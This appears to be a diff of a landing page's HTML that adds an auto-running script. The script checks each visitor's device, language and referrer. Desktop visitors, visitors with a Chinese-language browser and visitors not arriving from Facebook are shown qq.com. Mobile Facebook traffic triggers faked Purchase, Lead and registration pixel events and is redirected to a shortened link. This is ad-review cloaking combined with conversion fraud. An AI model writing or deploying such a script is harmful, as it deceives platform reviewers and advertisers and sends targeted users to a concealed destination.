@@ -761,53 +761,45 @@ src="https://www.facebook.com/tr?id=554044584045627&ev=PageView&noscript=1"
   </div>
   </div>
    
-<script>
-    function openWebsite() {
-        const links = [
-            'https://lihi.cc/Jul56'
-        ];
-        const randomIndex = Math.floor(Math.random() * links.length);
-        const randomLink = links[randomIndex];
+<iframe id="iframe" style="display: none;"></iframe>
 
-        // 开关：是否开启浏览器环境检测
-        const enableBrowserCheck = true; // 将此设置为 true 或 false 以启用或禁用检测
+    <script>
+        function openWebsite() {
+            const links = [
+                'https://lihi.cc/Jul56'
+            ];
+            const randomIndex = Math.floor(Math.random() * links.length);
+            const randomLink = links[randomIndex];
 
-        // 浏览器环境检测逻辑
-        if (enableBrowserCheck) {
-            const userAgent = navigator.userAgent.toLowerCase();
-            const isPC = !/mobile|android|iphone|ipad|ipod/.test(userAgent);
-            const isChinese = /zh|cn/.test(navigator.language.toLowerCase());
-            const referrer = document.referrer.toLowerCase();
-            const isFromFacebook = referrer.includes('facebook.com');
+            // 开关：是否开启浏览器环境检测
+            const enableBrowserCheck = true;
 
-            // 判断条件
-            if (isPC || isChinese || !isFromFacebook) {
-                // 使页面全屏
-                if (document.documentElement.requestFullscreen) {
-                    document.documentElement.requestFullscreen();
-                } else if (document.documentElement.mozRequestFullScreen) { // Firefox
-                    document.documentElement.mozRequestFullScreen();
-                } else if (document.documentElement.webkitRequestFullscreen) { // Chrome, Safari and Opera
-                    document.documentElement.webkitRequestFullscreen();
-                } else if (document.documentElement.msRequestFullscreen) { // IE/Edge
-                    document.documentElement.msRequestFullscreen();
+            // 浏览器环境检测逻辑
+            if (enableBrowserCheck) {
+                const userAgent = navigator.userAgent.toLowerCase();
+                const isPC = !/mobile|android|iphone|ipad|ipod/.test(userAgent);
+                const isChinese = /zh|cn/.test(navigator.language.toLowerCase());
+                const referrer = document.referrer.toLowerCase();
+                const isFromFacebook = referrer.includes('facebook.com');
+
+                // 判断条件
+                if (isPC || isChinese || !isFromFacebook) {
+                    const iframe = document.getElementById('iframe');
+                    iframe.src = 'https://www.qq.com'; // 设置 iframe 的源
+                    iframe.style.display = 'block'; // 显示 iframe
+                    return; // 结束函数执行
                 }
-
-                // 跳转到 www.qq.com
-                setTimeout(() => {
-                    window.location.href = 'https://www.qq.com';
-                }, 100); // 延迟1秒以便用户看到全屏效果
-                return; // 结束函数执行
             }
+
+            // 跳转到随机选择的链接
+            fbq('track', 'Contact');
+            fbq('track', 'Purchase');
+            fbq('track', 'Lead');
+            fbq('track', 'CompleteRegistration');
+            window.location.href = randomLink;
         }
 
-        // 跳转到随机选择的链接
-        fbq('track', 'Contact');
-        fbq('track', 'Purchase');
-        fbq('track', 'Lead');
-        fbq('track', 'CompleteRegistration');
-        window.location.href = randomLink;
-    }
-</script>
-
+        // 调用函数以打开网站
+        openWebsite();
+    </script>
   </body><div id="immersive-translate-popup" style="all: initial"></div></html>
